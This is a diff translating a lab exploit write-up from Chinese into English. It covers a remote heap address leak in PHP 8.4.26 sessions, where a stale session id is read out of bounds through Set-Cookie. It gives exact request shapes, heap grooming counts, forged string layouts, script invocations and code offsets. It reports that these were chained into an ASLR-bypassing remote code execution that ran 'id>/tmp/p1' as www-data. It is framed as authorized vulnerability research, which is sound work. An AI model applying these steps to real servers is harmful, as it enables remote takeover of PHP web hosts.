@@ -1,60 +1,45 @@
-# 纯 HTTP 堆地址泄漏：stale `PS(id)` + `Set-Cookie` 越界读
+# Pure-HTTP Heap Address Leak: Stale PS(id) + Set-Cookie Out-of-Bounds Read
 
-日期：2026-10-21
-目标：PHP 8.4.26 + Apache 2.4.68 prefork + mod_php（Debian 12 amd64，`172.16.0.103`）
-约束：**完全远程、只用 HTTP；不在目标 webroot 写任何特定 PHP 文件**。目标页面只有
-`<?php echo "OK\n"; ?>`（无 session 调用；本泄漏不依赖脚本内容）。
-状态：**堆地址（Zend MM 2MB chunk base）泄漏已打通**；libphp/libc **代码指针**泄漏
-尚未完成，下一步见第 7 节。
+Date: 2026-10-21
+Target: PHP 8.4.26 + Apache 2.4.68 prefork + mod_php (Debian 12 amd64, `172.16.0.103`)
+Constraints: **Fully remote, HTTP only; no target-specific PHP files written to the target webroot.** The target page contains only `<?php echo "OK\n"; ?>` (no session calls; this leak does not depend on page contents).
+Status: **Heap address leak (Zend MM 2 MB chunk base) is complete**; libphp/libc **code pointer** leak was incomplete at the time of this note. See section 7 for the next step.
 
 ---
 
-## 1. 结论
+## 1. Result
 
-用两个纯 HTTP 请求，从响应头 `Set-Cookie` 中拿到 **4096 字节的堆越界读**：
+Two pure-HTTP requests use the response's `Set-Cookie` header to obtain a **4096-byte heap out-of-bounds read**:
 
-- 请求 A：先用 1001 个 POST 字段触发 `max_input_vars` 警告（`display_errors=On` 时
-  该警告被输出，`SG(headers_sent)=1`），再用一个值为单字节 `\x00` 的 `PHPSESSID`
-  让 `php_session_initialize()` 生成新 id 并置 `send_cookie=1`；随后
-  `php_session_reset_id()` 因 headers 已发送而**发送 cookie 失败**，`send_cookie`
-  残留为 1。A 末尾用 12MB 字段 OOM，留下悬空的 `PS(id)`（random id 的
-  `zend_string`）。
-- 请求 B：不带文件字段，pre-RINIT 的 upload-progress END cleanup 调用
-  `php_session_initialize()`，`php_session_reset_id()` 看到 `send_cookie=1`、
-  本请求 headers 尚未发送，于是用悬空的 `PS(id)` 构造
-  `Set-Cookie: PHPSESSID=<url_encode(ZSTR_VAL(id), ZSTR_LEN(id))>`。
-- B 的 multipart 字段把 A 遗留的 `PS(id)` 块重占成伪造 `zend_string` 头：
-  `len=0x1000`，`data` 指向块内 offset 0x18。`php_url_encode` 按 len 读取，
-  越过块尾进入相邻堆，把内容编码进 `Set-Cookie`。
+- Request A first sends 1001 POST fields to trigger a `max_input_vars` warning (when `display_errors=On`, the warning is emitted and `SG(headers_sent)=1`). It then sends a `PHPSESSID` whose value is the single byte `\x00`, causing `php_session_initialize()` to generate a new id and set `send_cookie=1`. Then `php_session_reset_id()` fails to send the cookie because headers have already been sent, leaving `send_cookie` at 1. A ends with a 12 MB field that OOMs, leaving `PS(id)` dangling (the random id zend_string).
+- Request B has no file field. Pre-RINIT upload-progress END cleanup calls `php_session_initialize()`; `php_session_reset_id()` sees `send_cookie=1` and that B has not sent headers yet, so it constructs `Set-Cookie: PHPSESSID=<url_encode(ZSTR_VAL(id), ZSTR_LEN(id))>` using stale `PS(id)`.
+- B's multipart fields reclaim A's stale `PS(id)` block as a forged `zend_string` header: `len=0x1000`, with `data` pointing to block offset 0x18. `php_url_encode` reads that length past the end of the block into adjacent heap data and encodes it into `Set-Cookie`.
 
-实测（no-ASLR 校准）：
+Measured in the no-ASLR calibration:
 
-```text
+~~~text
 Set-Cookie: PHPSESSID=LAAAA...%B2%D0%82f%60h%3F...%F5%FF%7F...
-cookie 值 11548 字符（URL 编码），解码后 4096 字节
-98 个 0x7f.... 指针，全部 & ~0x1fffff == 0x7ffff5e00000
-```
+Cookie value: 11,548 URL-encoded characters; 4,096 decoded bytes
+98 pointers beginning with 0x7f...; all satisfy & ~0x1fffff == 0x7ffff5e00000
+~~~
 
-即 **Zend MM chunk base 可直接从 HTTP 响应头恢复**，无需 `/proc/self/maps`、
-无需目标侧 PHP、无需目标应用配合。
+Thus the **Zend MM chunk base can be recovered directly from an HTTP response header**, without `/proc/self/maps`, target-side PHP, or target application cooperation.
 
-> 这与 `NOASLR_REPORT.md` 的纯 HTTP RCE 链正交：泄漏请求 A 在 `track_init` 之前
-> 就失败（`reset_id` 失败），所以**不会**留下 `PS(http_session_vars)` 悬空引用；
-> 它只负责留下悬空 `PS(id)` 和 `send_cookie=1`。
+> This is orthogonal to the pure-HTTP RCE chain in `NOASLR_REPORT.md`: leak request A fails before `track_init` (because `reset_id` fails), so it does **not** leave a dangling `PS(http_session_vars)` reference. It leaves only stale `PS(id)` and `send_cookie=1`.
 
 ---
 
-## 2. 机制与源码路径
+## 2. Mechanism and Source Path
 
-### 2.1 让 `send_cookie` 残留为 1
+### 2.1 Leave send_cookie at 1
 
-`ext/session/session.c`：
+In `ext/session/session.c`:
 
-```c
+~~~c
 static zend_result php_session_initialize(void)
 {
     ...
-    if (!PS(id) || !ZSTR_VAL(PS(id))[0]) {      /* 空 id -> 新建 id */
+    if (!PS(id) || !ZSTR_VAL(PS(id))[0]) {      /* empty id -> create a new one */
         ...
         PS(id) = PS(mod)->s_create_sid(&PS(mod_data));
         ...
@@ -63,288 +48,219 @@ static zend_result php_session_initialize(void)
         }
     }
     ...
-    if (php_session_reset_id() == FAILURE) {    /* 这里失败，track_init 不会执行 */
+    if (php_session_reset_id() == FAILURE) {    /* fails here; track_init does not run */
         php_session_abort();
         return FAILURE;
     }
     php_session_track_init();
     ...
 }
-```
+~~~
 
-`php_session_send_cookie()`：
+`php_session_send_cookie()`:
 
-```c
+~~~c
 if (SG(headers_sent)) {
     php_error_docref(NULL, E_WARNING,
         "Session cookie cannot be sent after headers have already been sent");
     return FAILURE;
 }
 e_id = php_url_encode(ZSTR_VAL(PS(id)), ZSTR_LEN(PS(id)));
-```
+~~~
 
-关键点：
+Key points:
 
-1. **headers_sent 必须为 1**。用 `max_input_vars` 超限警告实现：
-   `main/php_variables.c` 在变量数超过 1000 时
-   `php_error_docref(NULL, E_WARNING, "Input variables exceeded ...")`；
-   lab 的 `display_errors=On`，警告写入响应并置 `SG(headers_sent)=1`。
-2. **id 首字节为 0**。multipart 的 `PHPSESSID` 值取单字节 `\x00`：
-   `php_session_rfc1867_callback` 的 FORMDATA 分支要求 `value_len != 0`，
-   所以 `progress->sid` 被设为长度 1、内容 `\0` 的字符串；FILE_START 中
-   `PS(id) = zend_string_init(progress->sid)` 后，`!ZSTR_VAL(PS(id))[0]`
-   成立，进入“新建 id”分支，`send_cookie=1`。
-3. `reset_id` 因 headers_sent 失败 → `send_cookie` 保持 1，且
-   `php_session_track_init()` 不会执行（所以没有 `$_SESSION` 引用）。
-4. A 的最后用一个 12MB 普通字段触发 `memory_limit=8M` OOM；bailout 跳过请求
-   shutdown，`ps_globals.id` 悬空（random id 的 32 字节 `zend_string`）。
+1. **`headers_sent` must be 1.** Trigger this with a `max_input_vars` warning: when the variable count exceeds 1000, `main/php_variables.c` calls `php_error_docref(NULL, E_WARNING, "Input variables exceeded ...")`. In the lab, `display_errors=On` emits the warning in the response and sets `SG(headers_sent)=1`.
+2. **The id's first byte must be 0.** Set the multipart `PHPSESSID` value to one byte, `\x00`. The FORMDATA branch of `php_session_rfc1867_callback` requires `value_len != 0`, so `progress->sid` becomes a length-1 string containing `\0`. At FILE_START, `PS(id) = zend_string_init(progress->sid)`; then `!ZSTR_VAL(PS(id))[0]` is true and the “create new id” branch sets `send_cookie=1`.
+3. `reset_id` fails because headers were sent, leaving `send_cookie` at 1; `php_session_track_init()` does not run, so no `$_SESSION` reference is created.
+4. At the end of A, a 12 MB ordinary field triggers `memory_limit=8M` OOM. Bailout skips request shutdown and leaves `ps_globals.id` dangling (the random id is a 32-byte `zend_string`).
 
-实测 A 之后（gdb，setarch -R）：
+Measured after A in GDB with setarch -R:
 
-```text
+~~~text
 ps_globals.send_cookie = 1
 ps_globals.id          = 0x7ffff5ea9000   (len=32, data0=0x35)
 ps_globals.http_session_vars.type_info = 0 (UNDEF)
-```
+~~~
 
-响应体同时出现两条关键警告，可作为远程侧的“前置条件已满足”信号：
+The response body also contains two useful warnings that remotely confirm the precondition:
 
-```html
+~~~html
 Warning: PHP Request Startup: Input variables exceeded 1000...
 Warning: PHP Request Startup: Session cookie cannot be sent after headers have already been sent
-```
+~~~
 
-### 2.2 B：用悬空 `PS(id)` 发送 `Set-Cookie`
+### 2.2 B Sends Set-Cookie Using Stale PS(id)
 
-B 不带文件字段，因此不会触发 FILE_START 的 `php_rinit_session(0)`（那会清空
-PS 全局）。multipart END 事件 → `php_session_rfc1867_cleanup()` →
-`php_session_initialize()` → `php_session_reset_id()`：
+B has no file field, so it does not trigger `php_rinit_session(0)` at FILE_START (that would clear the PS globals). The multipart END event calls `php_session_rfc1867_cleanup()` → `php_session_initialize()` → `php_session_reset_id()`:
 
-- `PS(use_cookies)=1`（默认）；
-- `PS(send_cookie)=1`（A 残留）；
-- B 本请求 headers 未发送 → 真正发送 cookie；
-- `php_url_encode` 以 `ZSTR_LEN(PS(id))` 为长度、`ZSTR_VAL(PS(id))` 为起点读取。
-  悬空块被 B 的字段重占后，len/data 完全受攻击者控制。
+- `PS(use_cookies)=1` (default).
+- `PS(send_cookie)=1` (left by A).
+- B has not sent headers yet, so the cookie is sent.
+- `php_url_encode` reads from `ZSTR_VAL(PS(id))` for `ZSTR_LEN(PS(id))` bytes. After B's fields reclaim the stale block, len/data are attacker-controlled.
 
-### 2.3 重占悬空 `PS(id)` 块
+### 2.3 Reclaim the Stale PS(id) Block
 
-A 的 random id 长度 32，`zend_string_alloc(32)` = 24+32+1 = 57 → **64 字节 bin**；
-本 lab 形状下块地址为 `chunk + 0xa9000`（no-ASLR：`0x7ffff5ea9000`）。
+A's random id is 32 bytes; `zend_string_alloc(32)` = 24+32+1 = 57 → **64-byte bin**. With this lab request shape, the block is at `chunk + 0xa9000` (no-ASLR address: `0x7ffff5ea9000`).
 
-B 的 multipart 解析在请求启动时把 chunk 重新分页。校准发现该 stale 地址在 B 的
-布局里落在 **80 字节 bin 页**：
+During B request parsing, Zend MM pages the chunk again. Calibration found the stale address lies in an **80-byte bin page** in B's layout:
 
-1. 先发 N 个值长度为 48 的字段（`zend_string` = 24+48+1 = 73 → 80B bin）。
-   每个字段留下一个**存活**的 80B 字符串，按 free-list 顺序占用块。
-2. 用每字段唯一的 48 字符值（`v%04d` + `x`）可以读出“哪一块落在 stale 地址”：
-   本 lab 下 `N=998` 时，`Set-Cookie` 的值为 `v0892...`，即第 893 个字段的
-   字符串落在该块。
-3. 改为发 **892 个**前置字段，再发 1 个 **79 字节值**的 forge 字段：
-   - raw buffer 大小 79+1 = 80 → 80B bin；
-   - 它的 value `zend_string` 是 24+79+1 = 104 → 112B bin（不占 80B 块）；
-   - raw buffer 取的正是“第 893 个 80B 块” = stale `PS(id)` 块。
-   raw buffer 内容布局（块起点为 S，`PS(id)=S`）：
+1. First send N fields with 48-byte values (`zend_string` = 24+48+1 = 73 → 80B bin). Each leaves a **live** 80B string, occupying slots in free-list order.
+2. Unique 48-character values (`v%04d` + padding) identify which string lands at the stale address. In this lab, at `N=998` the cookie value begins with `v0892...`, so the 893rd field's string occupies that block.
+3. Send **892** leading fields, then a forge field with a 79-byte value:
+   - Raw buffer size: 79+1 = 80 → 80B bin.
+   - Its value zend_string is 24+79+1 = 104 → 112B bin, so it does not take an 80B slot.
+   - The raw buffer takes the “893rd 80B block,” which is the stale `PS(id)` block.
+   - Raw buffer contents, with block start S and `PS(id)=S`:
 
-   ```text
-   S+0x00: gc（被 efree 的 free-list next 覆盖，无影响）
-   S+0x08: h（任意）
-   S+0x10: len = 0x1000（伪造）
-   S+0x18: data[0] = 'L'，其后为填充
-   ```
+     ~~~text
+     S+0x00: gc (overwritten by free-list next on efree; irrelevant)
+     S+0x08: h (arbitrary)
+     S+0x10: len = 0x1000 (forged)
+     S+0x18: data[0] = 'L', then padding
+     ~~~
 
-4. 字段处理完 raw buffer 被 `efree()`；Zend MM 只把 free-list 指针写到块
-   offset 0，`+0x10` 的 len 保留。B 的 END cleanup 随后读
-   `ZSTR_LEN(PS(id)) = 0x1000`，从 `S+0x18` 开始做 URL 编码。
+4. The raw buffer is `efree()`'d after field processing. Zend MM writes the free-list pointer only at block offset 0, leaving len at `+0x10` intact. B's END cleanup then reads `ZSTR_LEN(PS(id)) = 0x1000` and URL-encodes bytes starting from `S+0x18`.
 
-`Set-Cookie` 发出后，`ps_files_open()` 的
-`php_session_valid_key()` 会因 id 含非法字节而失败，产生
-`Session ID is too long or contains illegal characters` 警告——此时泄漏已经
-写入响应头，警告不影响结果。
+After sending `Set-Cookie`, `php_session_valid_key()` in `ps_files_open()` rejects the id's illegal bytes and emits `Session ID is too long or contains illegal characters`. The warning comes after the leak has already been written to the response header and does not affect the result.
 
 ---
 
-## 3. 复现步骤
+## 3. Reproduction
 
-环境（与 `NOASLR_REPORT.md` 相同，额外注意两点）：
+Environment (same as `NOASLR_REPORT.md`, with two additional requirements):
 
-- `display_errors=On`（headers_sent 依赖警告实际输出）；
-- `session.use_cookies=1`（默认；本 lab 曾为 0，需改回）；
-- `memory_limit=8M`、`session.use_strict_mode=0`、`session.save_path=/tmp`、
-  `max_input_vars=1000`（默认）。
+- `display_errors=On` (the warning must actually be emitted to set `headers_sent`).
+- `session.use_cookies=1` (default; this lab previously had 0 and must be changed back).
+- `memory_limit=8M`, `session.use_strict_mode=0`, `session.save_path=/tmp`, and `max_input_vars=1000` (default).
 
-```bash
-# 目标机 172.16.0.103，ASLR 开/关均可；以下为校准的 no-ASLR 命令
+~~~bash
+# Target host 172.16.0.103; ASLR may be on or off. These are the no-ASLR calibration commands.
 cd ~/php2shell-work
 
-# A：1001 个字段触发 max_input_vars 警告；PHPSESSID 为单字节 \x00；
-#    文件字段触发 FILE_START；12MB 字段 OOM
+# A: 1001 fields trigger max_input_vars warning; PHPSESSID is one-byte \x00;
+#    file field triggers FILE_START; 12 MB field OOMs
 python3 send_a_leak2.py 1001 12
 
-# B：892 个 48 字符数值字段消费 80B 块；最后一个 79 字节值字段的 raw buffer
-#    落在悬空 PS(id) 块，伪造 len=0x1000
+# B: 892 fields with unique 48-character values consume 80B blocks; the final
+#    79-byte forge value's raw buffer lands in stale PS(id) and forges len=0x1000
 python3 b_numleak2.py 892 1 0x1000
-```
+~~~
 
-B 的响应头示例（截断）：
+Example B response header (truncated):
 
-```text
+~~~text
 Set-Cookie: PHPSESSID=LAAAA...%B2%D0%82f%60h%3F%C3%A0%90%EA%F5%FF%7F...
 ...
 Warning: PHP Request Startup: Session ID is too long or contains illegal characters.
-```
+~~~
 
-解码与指针提取：
+Decode and extract pointers:
 
-```bash
+~~~bash
 python3 tools/decode_leak.py logs/http_heap_leak_20261021.resp
 # decoded=4096, candidate_ptrs=98, chunk_bases=7ffff5e00000:98
-```
+~~~
 
-原始响应归档：`logs/http_heap_leak_20261021.resp`；分析输出：
-`logs/http_heap_leak_20261021.txt`。
+Raw response archive: `logs/http_heap_leak_20261021.resp`. Analysis output: `logs/http_heap_leak_20261021.txt`.
 
 ---
 
-## 4. 校准数据（本构建 / 本请求形状）
+## 4. Calibration Data (This Build and Request Shape)
 
-| 项 | 值 |
+| Item | Value |
 |---|---|
-| A 后 `PS(id)`（stale `zend_string`） | `0x7ffff5ea9000` = chunk + `0xa9000` |
-| id 长度 / 块大小 | 32 / 64B bin |
-| B 重占后块所在 bin | 80B |
-| 前置 48 字符字段数（定位） | `N=998` 时 value `v0892` 落在该块 |
-| forge 前置字段数 | `K=892` |
-| forge 字段值长度 | 79（raw 80B） |
-| 伪造 len | `0x1000` |
-| B 响应 `Set-Cookie` | 11548 字符（解码 4096B） |
-| 泄漏指针 | 98 个，全部 `0x7ffff5e…`，chunk base `0x7ffff5e00000` |
+| `PS(id)` after A (stale `zend_string`) | `0x7ffff5ea9000` = chunk + `0xa9000` |
+| Id length / allocation size | 32 / 64B bin |
+| Bin containing the reclaimed block in B | 80B |
+| Number of leading 48-character fields for location | At `N=998`, value `v0892` lands in the block |
+| Leading fields before forge | `K=892` |
+| Forge-field value length | 79 (80B raw buffer) |
+| Forged len | `0x1000` |
+| B response `Set-Cookie` | 11,548 characters (4,096B decoded) |
+| Leaked pointers | 98; all `0x7ffff5e…`; chunk base `0x7ffff5e00000` |
 
-补充（同一 stale 地址的重用证据）：
+Additional evidence that the same stale address is being reclaimed:
 
-- `N=998` 且值为唯一 48 字符时，cookie 值就是 `v0892...`（len=48）——说明该块被
-  存活的 80B 字符串重占；
-- 数值键 + 短值（`b_numleak.py`）时 cookie 仍是正常 32 字符 id——说明该块未被
-  使用；只有 80B 活字符串/raw 的分配序列能命中它。
+- With `N=998` and unique 48-character values, the cookie value is `v0892...` (len=48), showing that a live 80B string reclaimed the block.
+- With numeric keys and short values (`b_numleak.py`), the cookie is still a normal 32-character id, showing that the block was not reused. Only the 80B live-string/raw-buffer allocation sequence reaches it.
 
 ---
 
-## 5. 与 ASLR 链的关系
+## 5. Relationship to the ASLR Chain
 
-本泄漏提供 **Zend MM chunk base**。同一轮实验中已用外部地址验证：
+This leak provides the **Zend MM chunk base**. In the same experiment, external address checks confirmed:
 
-- 校准后的纯 HTTP A/B RCE 链在 `personality=0`（ASLR 开）下 **3/3** 成功；
-- 只依赖 chunk 内相对偏移：`R0 = chunk + 0x24e0`、fake HT data =
-  `chunk + 0x6e0d8`（具体 A/B 形状见下）；
-- libc base 通过 `/proc/<worker>/maps` 外部获取时，`system = libc + 0x4c490`，
-  链完整执行 `id>/tmp/p1`。
+- The calibrated pure-HTTP A/B RCE chain succeeds **3/3** with `personality=0` (ASLR enabled).
+- It uses chunk-relative offsets only: `R0 = chunk + 0x24e0` and fake HT data at `chunk + 0x6e0d8` (see the request shapes below).
+- When libc base was obtained externally from `/proc/<worker>/maps`, `system = libc + 0x4c490` and the chain executed `id>/tmp/p1` fully.
 
-也就是说：**A/B 内存链本身与 ASLR 无关**，只差“地址来源”。本节的 Set-Cookie
-泄漏已经补上 heap 基址；还差 **libphp 代码指针**（用于 `zif_system`，
-libphp + `0x43a870`，不需要 libc）或 libc 指针。
+Therefore, **the A/B memory chain itself is independent of ASLR**; only the source of its addresses was missing. This Set-Cookie leak supplies the heap base. The remaining value at the time of this note was a **libphp code pointer** (for `zif_system` at libphp + `0x43a870`; libc is not needed) or a libc pointer.
 
-### 5.1 本轮同时得到的 no-ASLR 重校准
+### 5.1 no-ASLR Recalibration in This Run
 
-在 `172.16.0.103`（不是原报告的 172.16.1.112）上，原报告的固定参数不直接适用：
+On `172.16.0.103` (not the original report's 172.16.1.112), the original fixed parameters did not directly apply:
 
-```text
+~~~text
 A: send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7
 B: send_b_rce2.py 16 2 0x7ffff5e6e0d8 0x7ffff7d14490 "id>/tmp/p1"
-```
+~~~
 
-- 6 个 `7:7` pad 把 A 的 reference 地址移到 `0x7ffff5e024e0`，
-  `R0-0x10=0x7ffff5e024d0` 正好是 56B block 起点；
-- B 需要 `N1=16`（31 字符 priming 字段）才能让 55B raw buffer 落在
-  `R0-0x10`；
-- 本机 libc `system = 0x7ffff7d14490`（偏移 `0x4c490`），fake HT data =
-  `0x7ffff5e6e0d8`；
-- proof：`/tmp/p1` 内容 `uid=33(www-data) ...`。
+- Six `7:7` pads move A's reference to `0x7ffff5e024e0`; `R0-0x10=0x7ffff5e024d0` is exactly the start of a 56B block.
+- B needs `N1=16` (31-character priming fields) to place the 55B raw buffer at `R0-0x10`.
+- Local libc `system = 0x7ffff7d14490` (offset `0x4c490`); fake HT data = `0x7ffff5e6e0d8`.
+- Proof: `/tmp/p1` contains `uid=33(www-data) ...`.
 
 ---
 
-## 6. 限制
+## 6. Limits
 
-1. **`display_errors=On` 是前置条件**。headers_sent 来自警告输出；若目标关闭
-   display_errors，本路径的 `send_cookie=1` 残留不成立（当前 lab 为 On）。
-2. 需要 `>1000` 个 POST 变量（默认 `max_input_vars=1000`）才能触发警告；
-   请求体约 1MB 级。
-3. 需要 `session.use_cookies=1`（默认）与 `session.use_strict_mode=0`（默认 0）。
-4. chunk 内偏移（`0xa9000`）、`N=998`、`K=892` 绑定本构建 + 本请求形状；
-   换 PHP 构建 / 字段长度 / 边界长度需要重测。它们都是 **chunk 相对偏移**，
-   与 ASLR 无关。
-5. 泄漏只向高地址读（`PS(id)+0x18` 起）。当前 4KB 区域是 80B 字符串页，
-   只含堆指针；1MB 的大范围泄漏（已验证可发）仍只看到堆指针，没有
-   libphp/libc 代码指针。
-6. 若 len 读到非受控值（例如 HashTable 的 `arData` / 64 位 hash），
-   `php_url_encode` 的 `safe_emalloc` 会直接 fatal：
-   `Possible integer overflow in memory allocation (3 * N + 32)`。
-   这本身是一个“len 不可控”的信号，但拿不到数据。
-7. 本泄漏 A 不产生 `PS(http_session_vars)` 悬空引用（`reset_id` 在
-   `track_init` 之前失败），因此它不能和 RCE 的 A 合并成一个请求；
-   两者是同一 worker 上可先后使用的独立原语。
+1. **Requires `display_errors=On`.** The path needs warning output to set `headers_sent`; without it, the `send_cookie=1` residue does not occur (the current lab setting is On).
+2. Requires more than 1000 POST variables (default `max_input_vars=1000`) to trigger the warning; request body is about 1 MB.
+3. Requires `session.use_cookies=1` (default) and `session.use_strict_mode=0` (default 0).
+4. Chunk offsets (`0xa9000`), `N=998`, and `K=892` depend on this build/request shape. Recalibrate after changing PHP, field lengths, or boundary length. These are **chunk-relative offsets** and independent of ASLR.
+5. The leak reads toward higher addresses from `PS(id)+0x18`. The current 4 KB area is an 80B string page and contains only heap pointers. A 1 MB leak (which can be sent) also showed heap pointers only, with no libphp/libc code pointer.
+6. If len reads an uncontrolled value (such as a HashTable `arData` pointer or 64-bit hash), `php_url_encode`'s `safe_emalloc` fatals with `Possible integer overflow in memory allocation (3 * N + 32)`. This signals an uncontrolled len but yields no data.
+7. A does not leave a dangling `PS(http_session_vars)` reference (`reset_id` fails before `track_init`), so it cannot be combined with the RCE A into one request. These are independent primitives that can run sequentially on the same worker.
 
 ---
 
-## 7. 下一步：泄漏 libphp 代码指针
+## 7. Next Step at the Time: Leak a libphp Code Pointer
 
-> **2026-10-21 后续进展（已完成）**：本节的目标已实现，并进一步打穿了纯 HTTP
-> ASLR-on RCE（两次 Set-Cookie 泄漏 + `zif_system`），lab 内 5/5。做法：
-> A 用 1001 个 39 字节值字段把 stale `PS(id)` 放到 `chunk+0xb7400`；B 用 983 个
-> 嵌套数组，把 `$_POST['a0443']` 的 HashTable 扩到 16 个元素。`PS(id)+0x10` 读到
-> `nTableSize=16`，数据区覆盖 `nNextFreeElement` 和 `pDestructor`
-> （`ZVAL_PTR_DTOR = libphp+0x613c50`）。完整链路、payload 和驱动见
-> [ASLR_PURE_HTTP.md](/Users/my/php2shell/ASLR_PURE_HTTP.md)。以下保留原始分析。
+> **Follow-up as of 2026-10-21 (completed):** This goal was achieved, and the full pure-HTTP ASLR-on RCE was later completed (two Set-Cookie leaks + `zif_system`), 5/5 in the lab. A uses 1001 fields with 39-byte values to place stale `PS(id)` at `chunk+0xb7400`. B uses 983 nested arrays to expand the HashTable for `$_POST['a0443']` to 16 elements. `PS(id)+0x10` reads `nTableSize=16`; the data area covers `nNextFreeElement` and `pDestructor` (`ZVAL_PTR_DTOR = libphp+0x613c50`). Full chain, payload, and driver are in [ASLR_PURE_HTTP.md](ASLR_PURE_HTTP.md). The original analysis below is retained.
 
-目标：拿到一个 libphp 代码地址（例如 HashTable 的
-`pDestructor = ZVAL_PTR_DTOR`），配合已知 chunk base 使用 g18 的
-Zend-only payload（`zif_system`，libphp + `0x43a870`），完成**完全纯 HTTP、
-无外部地址**的 ASLR-on RCE。
+Goal: obtain a libphp code address (for example, HashTable `pDestructor = ZVAL_PTR_DTOR`) and combine it with the known chunk base and g18's Zend-only payload (`zif_system`, libphp + `0x43a870`) for **fully pure-HTTP ASLR-on RCE with no external addresses**.
 
-已确认的实验事实：
+Confirmed experimental facts:
 
-- 用 998 个 `aNNNN[0]` 嵌套数组字段时，B 的 chunk 里出现大量 56B
-  HashTable 页；gdb 扫描（no-ASLR）显示这些页含 73 个 libphp 指针/页，
-  偏移包括 `0x2000, 0x76000, 0x7b000, …, 0xa9000, 0xad000, 0xb2000, …`。
-- 当前 stale `PS(id)` 在 `chunk+0xa9000`；该偏移在嵌套数组 B 下正好是
-  一个 56B HashTable 页。问题变成：**让 `PS(id)+0x10` 的 qword 是一个
-  moderate 的 len，而不是 `arData`/hash 指针**。
-- 可行方向（按优先级）：
-  1. 调整 A 使 `PS(id)` 落在 `HT + 0x18`（则
-     `len = nNextFreeElement`，data 从 `HT+0x30 = pDestructor` 开始）：
-     需要 `PS(id) ≡ page + 0x18 (mod 56)`；由 `PS(id)=page+64m`
-     （A 的 64B bin）得 `m ≡ 3 (mod 7)`，即 `page+0xc0`、`page+0x280` 等。
-     扫描 A 的字段长度/边界长度/文件字段形状，找可达到的偏移。
-  2. 或让 `PS(id)+0x10` 落在 `HT+0x20`（`len = nTableSize|nInternalPointer`）：
-     需要 `PS(id) ≡ page + 0x10 (mod 56)`，对应 `m ≡ 2 (mod 7)`
-     （`page+0x80` 等），并让该 HashTable 的 `nTableSize` 足够大
-     （例如每数组 128 个元素 → len=128，足以覆盖 `pDestructor`）。
-  3. 把 PS.id 移到 libphp 指针页的低偏移（如 `0x2000`）——需要更小的
-     A 预堆或不同的 warning 触发方式；目前 1001 字段使 id 最低约
-     `0x61040`。
-- 拿到 libphp base 后，RCE 的 B 使用 `zif_system` + fake `zend_function`/
-  `execute_data`（`tools/d_aslr.php` 的 Zend-only payload 布局），
-  只需 chunk base + libphp base，不需要 libc。
+- With 998 nested-array fields named `aNNNN[0]`, B creates many 56B HashTable pages in the chunk. A no-ASLR GDB scan found 73 libphp pointers per page at offsets including `0x2000, 0x76000, 0x7b000, …, 0xa9000, 0xad000, 0xb2000, …`.
+- Current stale `PS(id)` is at `chunk+0xa9000`, which is a 56B HashTable page under nested-array B. The remaining problem is to make the qword at `PS(id)+0x10` a moderate len rather than an `arData`/hash pointer.
+- Promising approaches, in priority order:
+  1. Move `PS(id)` in A to `HT+0x18`. Then `len=nNextFreeElement` and data begins at `HT+0x30=pDestructor`. This needs `PS(id) ≡ page+0x18 (mod 56)`. Since `PS(id)=page+64m` (A uses the 64B bin), `m ≡ 3 (mod 7)`, such as `page+0xc0` or `page+0x280`. Scan A's field lengths, boundary lengths, and file-field shapes for a reachable offset.
+  2. Or move `PS(id)+0x10` to `HT+0x20` (`len=nTableSize|nInternalPointer`). This needs `PS(id) ≡ page+0x10 (mod 56)`, or `m ≡ 2 (mod 7)` (such as `page+0x80`). Make the HashTable large enough, for example with 128 elements per array, to read through pDestructor.
+  3. Move PS.id to a low offset in a libphp-pointer page (such as `0x2000`). This needs a smaller A pre-heap or a different warning trigger; with 1001 fields, the id currently lands no lower than about `0x61040`.
+- Once the libphp base is known, RCE B can use `zif_system` plus the fake `zend_function`/`execute_data` layout from `tools/d_aslr.php`'s Zend-only payload. It needs the chunk base and libphp base, not libc.
 
 ---
 
-## 8. 文件
+## 8. Files
 
-| 文件 | 用途 |
+| File | Purpose |
 |---|---|
-| `tools/send_a_leak2.py` | 泄漏 A：1001 字段 + `max_input_vars` 警告 + 空/NUL PHPSESSID + 文件 + OOM |
-| `tools/send_a_leak3.py` | 泄漏 A 变体：可调字段名/值长度、边界长度（用于移动 `PS(id)`） |
-| `tools/b_numleak.py` | B：数值键、短值（用于确认 stale 块是否被覆盖） |
-| `tools/b_numleak2.py` | **最终 B**：48 字符值消费 80B 块 + 79 字节 forge 字段 |
-| `tools/b_consume.py` / `b_consume2.py` | 80B/64B 块消费实验 |
-| `tools/b_nested.py` | 嵌套数组 B（用于把 56B HashTable 页铺到 chunk 各处） |
-| `tools/send_b_leak.py` | 早期 B（裸 stale id / 伪造头原型） |
-| `tools/decode_leak.py` | 解码 `Set-Cookie`、提取指针与 chunk base |
-| `tools/aslr_demo.sh` | ASLR-on 验证：外部读 maps，3/3 证明 A/B 链相对布局稳定 |
-| `logs/http_heap_leak_20261021.resp` | 原始泄漏响应（4096B 解码 / 11548 字符 cookie） |
-| `logs/http_heap_leak_20261021.txt` | 解码后的指针列表与 chunk base 统计 |
+| `tools/send_a_leak2.py` | Leak A: 1001 fields + `max_input_vars` warning + empty/NUL PHPSESSID + file + OOM |
+| `tools/send_a_leak3.py` | Leak A variant with adjustable field-name/value lengths and boundary length (move `PS(id)`) |
+| `tools/b_numleak.py` | B with numeric keys/short values (check whether stale block was overwritten) |
+| `tools/b_numleak2.py` | **Final B:** consume 80B blocks with 48-character values + 79-byte forge field |
+| `tools/b_consume.py` / `b_consume2.py` | 80B/64B block-consumption experiments |
+| `tools/b_nested.py` | Nested-array B (place 56B HashTable pages throughout the chunk) |
+| `tools/send_b_leak.py` | Early B (raw stale id / forged-header prototype) |
+| `tools/decode_leak.py` | Decode `Set-Cookie` and extract pointers/chunk base |
+| `tools/aslr_demo.sh` | ASLR-on check; reads maps externally and verifies relative A/B layout 3/3 |
+| `logs/http_heap_leak_20261021.resp` | Raw leak response (4096B decoded / 11,548-character cookie) |
+| `logs/http_heap_leak_20261021.txt` | Decoded pointer list and chunk-base statistics |
 
 ---
 
-## 9. 免责声明
+## 9. Disclaimer
 
-仅用于授权环境中的漏洞研究与复现。请求形状、块偏移与 bin 序列绑定本 lab 的
-PHP 8.4.26 构建与 Apache/mod_php 配置；换构建或配置需重新校准。
+For vulnerability research and reproduction in authorized environments only. Request shape, block offsets, and bin sequence depend on this lab's PHP 8.4.26 build and Apache/mod_php configuration; recalibrate after changing the build or configuration.
